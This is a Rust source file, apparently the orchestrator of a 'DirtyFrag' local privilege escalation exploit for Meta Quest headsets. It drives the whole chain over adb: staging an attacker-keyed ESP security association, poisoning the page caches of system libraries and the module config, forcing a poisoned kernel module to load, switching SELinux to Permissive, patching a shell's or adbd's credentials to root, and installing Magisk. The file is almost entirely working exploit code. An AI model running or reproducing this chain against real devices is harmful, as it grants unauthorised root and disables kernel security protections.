// The DirtyFrag-LPE orchestrator — one flow selector, all devices. Port of orchestrate.py's
// run()/run_merged(); target.kernel.merged picks the chain. build_credmod/build_carrier/inject-stub
// are now direct in-process Rust calls (no clang, no subprocess).
#![allow(dead_code)]
use std::path::{Path, PathBuf};
use std::thread::sleep;
use std::time::Duration;

use crate::adb::{Adb, Stager, WaitShell, pick_device};
use crate::assets;
use crate::credmod::{build_carrier, build_cfg, build_credmod};
use crate::emit::{build_inject_stub, build_libas_stub, inject_restore_spec, libas_restore_spec};
use crate::log::*;
use crate::target::Target;

#[derive(Clone, Copy, PartialEq)]
pub enum Cleanup { Reboot, LeaveDisabled, Postex, AdbRoot, NoRestore }

fn ms(m: u64) { sleep(Duration::from_millis(m)); }
fn secs(s: u64) { sleep(Duration::from_secs(s)); }

fn parse_ws(out: &str) -> Option<(u64, u64)> {
    let w = out.find("wrote=")?;
    let after = &out[w + 6..];
    let wn: String = after.chars().take_while(|c| c.is_ascii_digit()).collect();
    let s = out.find("skipped=")?;
    let after2 = &out[s + 8..];
    let sn: String = after2.chars().take_while(|c| c.is_ascii_digit()).collect();
    Some((wn.parse().ok()?, sn.parse().ok()?))
}

fn disable_phantom(adb: &Adb) {
    adb.sh("device_config put activity_manager max_phantom_processes 2147483647 2>/dev/null; \
            settings put global settings_enable_monitor_phantom_procs false 2>/dev/null; \
            device_config set_sync_disabled_for_tests persistent 2>/dev/null; true");
}

fn adbd_pid(adb: &Adb) -> Option<String> {
    let p = adb.sh("pidof adbd");
    p.split_whitespace().next().filter(|s| s.chars().all(|c| c.is_ascii_digit())).map(|s| s.to_string())
}

fn mod_name(device_path: &str) -> String {
    let base = Path::new(device_path).file_name().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default();
    base.strip_suffix(".ko").unwrap_or(&base).replace('-', "_")
}

fn write_spec(workdir: &Path, tag: &str, spec: &[u8]) -> PathBuf {
    let p = workdir.join(format!("{}.spec", tag));
    std::fs::write(&p, spec).unwrap_or_else(|e| die(&format!("write spec: {}", e)));
    p
}

/// Poison one file's page cache via the on-device Writer (idempotent; retried).
fn poison(adb: &Adb, workdir: &Path, dev_path: &str, spec: &[u8], tag: &str) {
    let sp = write_spec(workdir, tag, spec);
    adb.push(&sp.to_string_lossy(), &format!("/data/local/tmp/{}.spec", tag));
    let total = (spec.len() / 5) as u64;
    let mut out = String::new();
    for attempt in 1..=8 {
        out = adb.sh(&format!("cd /data/local/tmp && CLASSPATH=e2e.dex app_process / q3.Writer {} /data/local/tmp/{}.spec", dev_path, tag));
        if let Some((w, s)) = parse_ws(&out) {
            if w + s == total { info(&format!("{}: wrote={} skipped={}{}", tag, w, s, if attempt > 1 { format!("  ({} tries)", attempt) } else { String::new() })); return; }
        }
        if attempt < 8 {
            let exc = out.lines().find(|l| l.contains("[!]") || l.contains("Exception") || l.contains("Error")).unwrap_or("").trim();
            warn(&format!("{}: writer incomplete (attempt {}/8) — retrying  [{}]", tag, attempt, &exc.chars().take(200).collect::<String>()));
            secs(2);
        }
    }
    die(&format!("{} poison failed: ...{}", tag, &out.chars().rev().take(160).collect::<String>().chars().rev().collect::<String>()));
}

/// One Writer invocation for several files.
fn poison_batch(adb: &Adb, workdir: &Path, items: &[(String, Vec<u8>, String)]) {
    let mut args = String::new();
    let mut total = 0u64;
    let mut tags = Vec::new();
    for (dev_path, spec, tag) in items {
        let sp = write_spec(workdir, tag, spec);
        adb.push(&sp.to_string_lossy(), &format!("/data/local/tmp/{}.spec", tag));
        args.push_str(&format!("{} /data/local/tmp/{}.spec ", dev_path, tag));
        total += (spec.len() / 5) as u64;
        tags.push(tag.clone());
    }
    let mut out = String::new();
    for attempt in 1..=8 {
        out = adb.sh(&format!("cd /data/local/tmp && CLASSPATH=e2e.dex app_process / q3.Writer {}", args.trim()));
        if let Some((w, s)) = parse_ws(&out) {
            if w + s == total { info(&format!("{}: wrote={} skipped={}{}", tags.join("+"), w, s, if attempt > 1 { format!("  ({} tries)", attempt) } else { String::new() })); return; }
        }
        if attempt < 8 {
            let exc = out.lines().find(|l| l.contains("[!]") || l.contains("Exception") || l.contains("Error")).unwrap_or("").trim();
            warn(&format!("batch writer incomplete (attempt {}/8) — retrying  [{}]", attempt, &exc.chars().take(200).collect::<String>()));
            secs(2);
        }
    }
    die(&format!("batch poison failed: ...{}", &out.chars().rev().take(160).collect::<String>().chars().rev().collect::<String>()));
}

// deltas + struct offsets from the target
fn deltas(t: &Target) -> (i64, i64, i64, i64) {
    (t.hx(&["kernel", "delta_selinux_from_anchor"]),
     t.hx(&["kernel", "delta_findvpid_from_anchor"]),
     t.hx(&["kernel", "delta_pidtask_from_anchor"]),
     t.hx(&["kernel", "delta_ssuse_from_anchor"]))
}

/// Build a diff-patched cred carrier for `pid` from the target's carrier params.
fn build_cred(t: &Target, carrier_bytes: Vec<u8>, pid: i64, ctx: bool) -> (Vec<u8>, String) {
    let (dsel, dfv, dpt, dssuse) = deltas(t);
    let enf = t.hx_or(&["kernel", "enforcing_off"], 0) as u32;
    let cred = t.hx_or(&["kernel", "cred_off"], 0x778) as u32;
    let csec = if ctx {
        Some(t.hx_opt(&["kernel", "cred_security_off"]).unwrap_or_else(|| die("--adb-root needs kernel.cred_security_off in the target JSON")) as u32)
    } else { None };
    build_credmod(carrier_bytes, dsel, dfv, dpt, pid, dssuse, enf, cred, csec).unwrap_or_else(|e| die(&format!("build_credmod failed: {}", e)))
}

fn read_local(p: &Path) -> Vec<u8> { std::fs::read(p).unwrap_or_else(|e| die(&format!("read {}: {}", p.display(), e))) }

fn inj_dev_path(t: &Target) -> String { t.s(&[t.inj_key(), "device_path"]) }

fn push_bytes(adb: &Adb, workdir: &Path, name: &str, bytes: &[u8], remote: &str) {
    let p = workdir.join(name);
    std::fs::write(&p, bytes).unwrap();
    adb.push(&p.to_string_lossy(), remote);
}

// ============================== two-carrier flow (Quest 3 / 3S 5.10 non-merged) ==============================
pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_root: bool, settle_ms: u64, skip_magisk: bool) {
    if t.merged() { return run_merged(t, device_override, cleanup, verify_root, settle_ms, skip_magisk); }
    let workdir = make_workdir();
    banner(&format!("DIRTYFRAG-LPE   target: {}", t.s(&["name"])));
    info(&t.s(&["description"]));

    let serial = pick_device(&t.s(&["device", "build_incremental"]), device_override);
    let adb = Adb::new(&serial);
    step("Preflight");
    let dev_build = adb.getprop("ro.build.version.incremental");
    let msg = format!("device {}  build {}", serial, dev_build);
    if dev_build == t.s(&["device", "build_incremental"]) { ok(&msg); } else { warn(&msg); }
    let before = adb.sh("getenforce");
    info(&format!("uid={}  getenforce={}", adb.sh("id -u"), before));
    if before != "Enforcing" { warn(&format!("SELinux already {} (expected Enforcing)", before)); }
    let dex = assets::write_to(&workdir, "e2e.dex", assets::E2E_DEX);
    adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex");
    disable_phantom(&adb);

    banner("BUILD  (host)");
    step("Carrier .ko  (52-byte diff-injection, enforcing=0)");
    let carrier_cur = read_local(&t.local_path(&["carrier", "local_ko"]));
    let carrier_want = build_carrier(carrier_cur.clone(), t.hx(&["carrier", "anchor_reloc_off"]) as u64,
        t.hx(&["kernel", "delta_selinux_from_anchor"]) as u32).unwrap_or_else(|e| die(&e));
    let ndiff = carrier_want.iter().zip(&carrier_cur).filter(|(a, b)| a != b).count();
    ok(&format!("carrier_patched.ko  ({} diff bytes, anchor={}, delta={})", ndiff, t.s(&["kernel", "anchor_symbol"]), t.s(&["kernel", "delta_selinux_from_anchor"])));
    step("init.insmod.cfg  (+insmod line, modprobe kept)");
    let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
    ok(&format!("cfg patched  ({} diff bytes)", cfg_want.iter().zip(&cfg_cur).filter(|(a, b)| a != b).count()));

    banner("STAGE  (shell: Dirty-Frag SA)");
    let mut stager = Stager::new(&serial);
    step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
    let port = stager.start().unwrap_or_else(|| die("stager failed (stale SA? reboot to clear xfrm)"));
    ok(&format!("SA live, encap port {}  (held by background stager)", port));

    let spi = t.hx(&["dirtyfrag", "sa_spi"]) as u32;
    let kmb = t.hx(&["dirtyfrag", "keymat_base"]) as u8;
    let ik = t.inj_key();
    let eva_stub_len;
    let mut orig_las: Vec<u8> = Vec::new();

    banner("POISON  (shell -> page caches)");
    step("inject-lib + libandroid stubs  (batched: one SA/JVM, 2 files)");
    let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
        t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64,
        &[(t.s(&["carrier", "device_path"]), carrier_cur.clone(), carrier_want.clone()),
          (t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())]).unwrap_or_else(|e| die(&e));
    eva_stub_len = eva_raw.len();
    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &t.s(&["services", "tracking"]),
        t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
    if matches!(cleanup, Cleanup::Postex | Cleanup::LeaveDisabled | Cleanup::Reboot) {
        orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
    }
    info(&format!("inject stub {}B (carrier IVs={}, cfg IVs={}); libas {}B", eva_raw.len(), cnts[0], cnts[1], las_raw.len()));
    poison_batch(&adb, &workdir, &[
        (inj_dev_path(t), eva_spec, "inject".into()),
        (t.s(&["libandroid_servers", "device_path"]), las_spec, "libas".into())]);

    banner("TRIGGER  (shell)");
    let tsvc = t.s(&["services", "tracking"]);
    let isvc = t.s(&["services", "insmod_sh"]);
    step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier + cfg", tsvc));
    let pid0 = adb.sh(&format!("pidof {}", tsvc));
    adb.sh("dumpsys input >/dev/null 2>&1");
    let mut pid1 = pid0.clone();
    for _ in 0..60 { ms(300); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
    if pid1 == pid0 || pid1.is_empty() { stager.stop(); die(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0)); }
    ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
    info(&format!("settling {}ms for the ctor's carrier/cfg poison to complete", settle_ms));
    ms(settle_ms);
    if verify_root {
        let csha = adb.su(&format!("sha1sum {}", t.s(&["carrier", "device_path"])));
        info(&format!("carrier page-cache sha (root check): {}…", &csha.chars().take(12).collect::<String>()));
    }
    if adb.sh(&format!("lsmod | grep -c {}", mod_name(&t.s(&["carrier", "device_path"])))) != "0" {
        warn("carrier already loaded before finit — original may have raced in; reboot & retry");
    }
    step(&format!("setprop ctl.start {}  ->  init finit_modules the poisoned carrier", isvc));
    adb.sh(&format!("setprop ctl.start {}", isvc));

    banner("VERIFY");
    let mut after = String::new();
    for _ in 0..16 { ms(400); after = adb.sh("getenforce"); if after == "Permissive" { break; } }
    if after == "Permissive" {
        win(&format!("SELinux {} -> {}   (from uid={} shell, zero root)", before, after, adb.sh("id -u")));
        if verify_root { info(&format!("module: {}", { let m = adb.su(&format!("lsmod | grep {}", mod_name(&t.s(&["carrier", "device_path"])))); if m.is_empty() { "(not listed)".into() } else { m } })); }
    } else {
        err(&format!("getenforce={} (expected Permissive) — chain did not complete", after));
    }
    stager.stop(); ok("stager stopped (SA reaped)");

    match cleanup {
        Cleanup::Reboot => {
            banner("RESTORE  (reboot)");
            step("setenforce 1; rmmod; reboot (clears all page-cache poison + xfrm)");
            adb.su(&format!("setenforce 1; rmmod {}", mod_name(&t.s(&["carrier", "device_path"]))));
            adb.reboot(); adb.wait_for_device();
            for _ in 0..40 { if adb.getprop("sys.boot_completed") == "1" { break; } secs(3); }
            let ge = adb.sh("getenforce");
            if ge == "Enforcing" { ok(&format!("post-reboot getenforce={}", ge)); } else { warn(&format!("post-reboot getenforce={}", ge)); }
        }
        Cleanup::LeaveDisabled => {
            banner("CLEANUP  (leave SELinux disabled, no reboot)");
            step("Revert the code-injection poisons via shell (no root, no reboot)");
            poison(&adb, &workdir, &inj_dev_path(t), &inject_restore_spec(t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, t.hx(&[ik, "orig_ctor_off"]) as u64, eva_stub_len), "inject_restore");
            info("inject-lib: init_array[0] -> orig ctor, stub gap zeroed");
            if !orig_las.is_empty() {
                poison(&adb, &workdir, &t.s(&["libandroid_servers", "device_path"]), &libas_restore_spec(t.hx(&["libandroid_servers", "dump_off"]) as u64, &orig_las), "libas_restore");
                info("libandroid_servers::dump restored");
            }
            let ge = adb.sh("getenforce");
            if ge == "Permissive" { win(&format!("getenforce={}  — code poisons reverted, NO reboot", ge)); } else { warn(&format!("getenforce={}", ge)); }
            warn("residue (benign, needs root/reboot): carrier/cfg page-cache poison + loaded module");
            info("READY FOR POST-EX: run with --postex");
        }
        Cleanup::Postex => run_postex_twocarrier(t, &adb, &workdir, ik, eva_stub_len, &orig_las, skip_magisk),
        Cleanup::AdbRoot => run_adbroot_twocarrier(t, &adb, &workdir),
        Cleanup::NoRestore => warn("--no-restore: device left fully poisoned & permissive"),
    }
}

fn run_postex_twocarrier(t: &Target, adb: &Adb, workdir: &Path, ik: &str, eva_stub_len: usize, orig_las: &[u8], skip_magisk: bool) {
    banner("POST-EX  (root via insmod_sh -> Magisk)");
    if adb.sh("getenforce") != "Permissive" { die("not permissive — base chain failed; aborting post-ex"); }
    step("Reverting code-injection poisons (inject-lib/libandroid) via shell");
    poison(adb, workdir, &inj_dev_path(t), &inject_restore_spec(t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, t.hx(&[ik, "orig_ctor_off"]) as u64, eva_stub_len), "inject_restore");
    if !orig_las.is_empty() {
        poison(adb, workdir, &t.s(&["libandroid_servers", "device_path"]), &libas_restore_spec(t.hx(&["libandroid_servers", "dump_off"]) as u64, orig_las), "libas_restore");
    }
    step("Launching waiting shell (to be cred-patched to uid 0)");
    let mut cmods = Vec::new();
    for c in ["cred_carrier", "carrier"] { if t.has(&[c]) { let m = mod_name(&t.s(&[c, "device_path"])); if !cmods.contains(&m) { cmods.push(m); } } }
    let mut wsh = WaitShell::new(&adb.serial, skip_magisk, &cmods.join(" "));
    let pid = wsh.start().unwrap_or_else(|| die("waiting shell failed"));
    ok(&format!("waiting shell pid {}", pid));
    step("Diff-patching cred carrier (usbip-vudc: enforcing=0 + cred-patch, anchor-relative)");
    let cc = read_local(&t.local_path(&["cred_carrier", "local_ko"]));
    let (credko, cmsg) = build_cred(t, cc, pid, false);
    info(&cmsg);
    push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
    stage_postex_assets(adb, workdir);
    step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)");
    poison_cfg_direct(t, adb, workdir, "/data/local/tmp/uv.ko");
    step("ctl.start insmod_sh -> loads uv.ko -> cred-patches the waiting shell to root");
    adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
    let mut rooted = false; let mut uline = String::new();
    for _ in 0..20 { secs(1); uline = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", pid)); if uline.split_whitespace().nth(1) == Some("0") { rooted = true; break; } }
    if !rooted { wsh.stop(); die(&format!("waiting shell not rooted (uv.ko load failed?) — {}", if uline.is_empty() { "no Uid line".into() } else { uline })); }
    ok(&format!("waiting shell {} cred-patched -> uid 0", pid));
    step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)");
    wsh.release();
    for _ in 0..90 { if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y" { break; } secs(2); }
    wsh.stop();
    banner("POST-EX RESULT");
    let logtxt = adb.sh("cat /data/local/tmp/postex.log 2>/dev/null");
    println!("{}", if logtxt.is_empty() { "(no log)".into() } else { logtxt });
    let ge = adb.sh("getenforce");
    if ge == "Enforcing" { win(&format!("final getenforce={}  (Magisk policy live if Enforcing)", ge)); } else { warn(&format!("final getenforce={}", ge)); }
}

fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path) {
    banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)");
    if adb.sh("getenforce") != "Permissive" { die("not permissive — base chain failed; aborting adb-root"); }
    let pid = adbd_pid(adb).unwrap_or_else(|| die("could not find adbd pid"));
    let cc = read_local(&t.local_path(&["cred_carrier", "local_ko"]));
    step(&format!("Cred carrier (usbip-vudc) -> adbd pid {} + uid0 + caps + kernel ctx", pid));
    let (credko, cmsg) = build_cred(t, cc, pid.parse().unwrap_or(0), true);
    info(&cmsg);
    push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
    step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)");
    poison_cfg_direct(t, adb, workdir, "/data/local/tmp/uv.ko");
    step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
    adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
    let mut rooted = false;
    for _ in 0..40 { ms(300); if adb.sh("id -u") == "0" { rooted = true; break; } }
    if !rooted { die("adb shell not root (uv.ko load failed?)"); }
    win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context", pid));
    info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
    warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)");
}

/// shell-direct cfg poison over the whole inject region (permissive, or shell-readable cfg).
fn poison_cfg_direct(t: &Target, adb: &Adb, workdir: &Path, insmod_path: &str) {
    let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
    let (_c, cfg_want) = build_cfg(cfg_orig, insmod_path, t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
    let off = t.hx(&["cfg", "inject_off"]) as usize; let ln = t.hx(&["cfg", "inject_len"]) as usize;
    let mut spec = Vec::new();
    for i in off..off + ln { spec.extend_from_slice(&(i as u32).to_le_bytes()); spec.push(cfg_want[i]); }
    poison(adb, workdir, &t.s(&["cfg", "device_path"]), &spec, "cfg_pe");
}

fn stage_postex_assets(adb: &Adb, workdir: &Path) {
    step("Staging post-ex assets (postex.sh, singularity_magisk.sh, singularity-Magisk.apk)");
    let p = assets::write_to(workdir, "postex.sh", assets::POSTEX_SH);
    adb.push(&p.to_string_lossy(), "/data/local/tmp/postex.sh");
    let p = assets::write_to(workdir, "singularity_magisk.sh", assets::SINGULARITY_SH);
    adb.push(&p.to_string_lossy(), "/data/local/tmp/singularity_magisk.sh");
    let p = assets::write_to(workdir, "singularity-Magisk.apk", assets::SINGULARITY_APK);
    adb.push(&p.to_string_lossy(), "/data/local/tmp/singularity-Magisk.apk");
}

// ============================== merged flow (Quest Pro 4.19 / Q2 / Q3S .text-splice) ==============================
pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _verify_root: bool, settle_ms: u64, skip_magisk: bool) {
    let workdir = make_workdir();
    banner(&format!("DIRTYFRAG-LPE (merged)   target: {}", t.s(&["name"])));
    info(&t.s(&["description"]));
    let serial = pick_device(&t.s(&["device", "build_incremental"]), device_override);
    let adb = Adb::new(&serial);
    step("Preflight");
    let dev_build = adb.getprop("ro.build.version.incremental");
    let m = format!("device {}  build {}", serial, dev_build);
    if dev_build == t.s(&["device", "build_incremental"]) { ok(&m); } else { warn(&m); }
    let before = adb.sh("getenforce");
    info(&format!("uid={}  getenforce={}  (merged chain: {} carrier, enforcing@+{}, cred@{})",
        adb.sh("id -u"), before, mod_name(&t.s(&["carrier", "device_path"])), t.hx_or(&["kernel", "enforcing_off"], 0), t.s_opt(&["kernel", "cred_off"]).unwrap_or("0x778".into())));
    if before != "Enforcing" { warn(&format!("SELinux already {} (chain assumes Enforcing; will still run)", before)); }
    let dex = assets::write_to(&workdir, "e2e.dex", assets::E2E_DEX);
    adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex");
    disable_phantom(&adb);

    banner("STAGE  (shell: Dirty-Frag SA)");
    let mut stager = Stager::new(&serial);
    step(&format!("Staging attacker-keyed AES-GCM ESP SA ({})", t.s(&["dirtyfrag", "sa_spi"])));
    let port = stager.start().unwrap_or_else(|| { die("stager failed (stale SA? reboot to clear xfrm)") });
    ok(&format!("SA live, encap port {}", port));

    let ik = t.inj_key();
    let adb_root = cleanup == Cleanup::AdbRoot;
    let mut wsh: Option<WaitShell> = None;
    let eva_stub_len;
    let mut orig_las: Vec<u8> = Vec::new();
    let mut reverted = false;

    // target pid (adbd for adb-root, else waiting shell)
    let pid: i64;
    if adb_root {
        let p = adbd_pid(&adb).unwrap_or_else(|| { stager.stop(); die("could not find adbd pid") });
        step(&format!("Target: adbd pid {} (cred-patch -> uid0 + all caps + kernel context)", p));
        pid = p.parse().unwrap_or(0);
    } else {
        step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)");
        let cmod = mod_name(&t.s(&["carrier", "device_path"]));
        let mut w = WaitShell::new(&serial, skip_magisk, &cmod);
        let p = w.start().unwrap_or_else(|| { stager.stop(); die("waiting shell failed") });
        ok(&format!("waiting shell pid {}", p));
        pid = p;
        wsh = Some(w);
    }

    banner("BUILD  (host)");
    step(&format!("Merged carrier (build_credmod: enforcing=0 + status-sync + cred-patch{}, anchor-relative)", if adb_root { " + kernel-context" } else { "" }));
    let cc = read_local(&t.local_path(&["carrier", "local_ko"]));
    let (credko, cmsg) = build_cred(t, cc.clone(), pid, adb_root);
    ok(&cmsg);
    let carrier_want = credko.clone();
    let carrier_cur = cc;
    step("init.insmod.cfg  (+insmod line for the carrier)");
    let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
    ok(&format!("cfg patched  ({} diff bytes)", cfg_want.iter().zip(&cfg_cur).filter(|(a, b)| a != b).count()));

    banner("POISON  (shell -> page caches)");
    let shell_cfg = t.bool_or(&["cfg", "shell_poison_under_enforcing"], false);
    let mut inj_files = vec![(t.s(&["carrier", "device_path"]), carrier_cur, carrier_want)];
    if !shell_cfg { inj_files.push((t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())); }
    step(&format!("inject-lib stub  (init_array[0] -> {}-file poison in the gap)", inj_files.len()));
    let spi = t.hx(&["dirtyfrag", "sa_spi"]) as u32;
    let kmb = t.hx(&["dirtyfrag", "keymat_base"]) as u8;
    let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
        t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files).unwrap_or_else(|e| die(&e));
    eva_stub_len = eva_raw.len();
    info(&format!("stub {}B  (IVs={:?})  gap fits {}B", eva_raw.len(), cnts, t.hx(&[ik, "stub_gap_size"])));
    poison(&adb, &workdir, &inj_dev_path(t), &eva_spec, "inject");
    step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)");
    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &t.s(&["services", "tracking"]),
        t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
    orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
    poison(&adb, &workdir, &t.s(&["libandroid_servers", "device_path"]), &las_spec, "libas");

    let do_revert = |adb: &Adb, workdir: &Path, reverted: &mut bool| {
        if *reverted { return; }
        *reverted = true;
        if eva_stub_len > 0 {
            poison(adb, workdir, &inj_dev_path(t), &inject_restore_spec(t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, t.hx(&[ik, "orig_ctor_off"]) as u64, eva_stub_len), "inject_restore");
        }
        if !orig_las.is_empty() {
            poison(adb, workdir, &t.s(&["libandroid_servers", "device_path"]), &libas_restore_spec(t.hx(&["libandroid_servers", "dump_off"]) as u64, &orig_las), "libas_restore");
        }
    };

    banner("TRIGGER  (shell)");
    let tsvc = t.s(&["services", "tracking"]);
    let isvc = t.s(&["services", "insmod_sh"]);
    step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier", tsvc));
    let pid0 = adb.sh(&format!("pidof {}", tsvc));
    adb.sh("dumpsys input >/dev/null 2>&1");
    let mut pid1 = pid0.clone();
    for _ in 0..20 { secs(1); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
    if pid1 == pid0 || pid1.is_empty() {
        err(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0));
        do_revert(&adb, &workdir, &mut reverted); stager.stop();
        if let Some(mut w) = wsh { w.stop(); }
        return;
    }
    ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
    info(&format!("settling {}ms for the ctor's carrier poison to complete", settle_ms));
    ms(settle_ms);

    step("Reverting inject-lib + libandroid poison (ctor done; before module load)");
    do_revert(&adb, &workdir, &mut reverted);

    if shell_cfg {
        step("init.insmod.cfg  (shell-direct; readable under Enforcing here)");
        adb.sh(&format!("cat {} >/dev/null 2>&1", t.s(&["cfg", "device_path"])));
        let off = t.hx(&["cfg", "inject_off"]) as usize; let ln = t.hx(&["cfg", "inject_len"]) as usize;
        let mut spec = Vec::new();
        for i in off..off + ln { spec.extend_from_slice(&(i as u32).to_le_bytes()); spec.push(cfg_want[i]); }
        poison(&adb, &workdir, &t.s(&["cfg", "device_path"]), &spec, "cfg");
    } else {
        info("init.insmod.cfg was poisoned by the 2-file ctor (not shell-readable under Enforcing)");
    }

    step(&format!("setprop ctl.start {}  ->  init finit_modules the poisoned carrier", isvc));
    adb.sh(&format!("setprop ctl.start {}", isvc));

    banner("VERIFY  (enforcing flip + root)");
    let mut rooted = false;
    let mut uline = String::new();
    for _ in 0..20 {
        secs(1);
        if adb_root { if adb.sh("id -u") == "0" { rooted = true; break; } }
        else if let Some(w) = &wsh { uline = adb.sh(&format!("grep -m1 Uid /proc/{}/status 2>/dev/null", w.pid.unwrap_or(0))); if uline.split_whitespace().nth(1) == Some("0") { rooted = true; break; } }
    }
    let after = adb.sh("getenforce");
    let mut success = false;
    if after == "Permissive" {
        win(&format!("SELinux {} -> {}   (zero root)", before, after));
        if rooted {
            if adb_root { win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + kernel ctx", pid)); }
            else { win(&format!("waiting shell {} cred-patched -> uid 0", wsh.as_ref().and_then(|w| w.pid).unwrap_or(0))); }
            success = true;
        } else {
            err(&format!("permissive but {}", if adb_root { "adb shell not root yet".to_string() } else { format!("shell not cred-patched — {}", if uline.is_empty() { "no Uid line".into() } else { uline }) }));
        }
    } else {
        err(&format!("getenforce={} (expected Permissive) — carrier load failed / did not run", after));
    }

    do_revert(&adb, &workdir, &mut reverted);
    stager.stop(); ok("stager stopped (SA reaped)");

    if !success {
        if let Some(mut w) = wsh { w.stop(); }
        err("merged chain did NOT complete — inject/libandroid poisons reverted.");
        warn("if the DEVICE crashed/rebooted after this, grab the panic log once it is back:");
        warn("  su -c 'cat /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0 /proc/last_kmsg 2>/dev/null'");
        return;
    }

    match cleanup {
        Cleanup::Postex => {
            let mut w = wsh.take().unwrap();
            banner("POST-EX  (root shell -> Magisk)");
            stage_postex_assets(&adb, &workdir);
            step("Releasing rooted shell -> postex.sh (drop_caches, rmmod, Magisk, setenforce 1)");
            w.release();
            for _ in 0..90 { if adb.sh("[ -f /data/local/tmp/postex_done ] && echo y") == "y" { break; } secs(2); }
            w.stop();
            banner("POST-EX RESULT");
            let logtxt = adb.sh("cat /data/local/tmp/postex.log 2>/dev/null");
            println!("{}", if logtxt.is_empty() { "(no log)".into() } else { logtxt });
            let ge = adb.sh("getenforce");
            if ge == "Enforcing" { win(&format!("final getenforce={}  (Magisk policy live if Enforcing)", ge)); } else { warn(&format!("final getenforce={}", ge)); }
        }
        Cleanup::AdbRoot => {
            banner("DONE  (adbd rooted + Permissive, NO Magisk)");
            win("adbd is uid0 + all caps + kernel context; SELinux left Permissive.");
            info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
            warn("residue (needs reboot): carrier page-cache poison + loaded carrier module (exit neutralized, rmmod-safe)");
        }
        _ => {
            banner("DONE  (rooted + Permissive, code poisons reverted)");
            if let Some(mut w) = wsh { w.stop(); }
            info("device is Permissive with a root-capable module loaded; run again with --postex/--adb-root.");
            warn("residue (needs reboot): carrier/cfg page-cache poison + loaded carrier module");
        }
    }
}

fn make_workdir() -> PathBuf {
    let mut d = std::env::temp_dir();
    let pid = std::process::id();
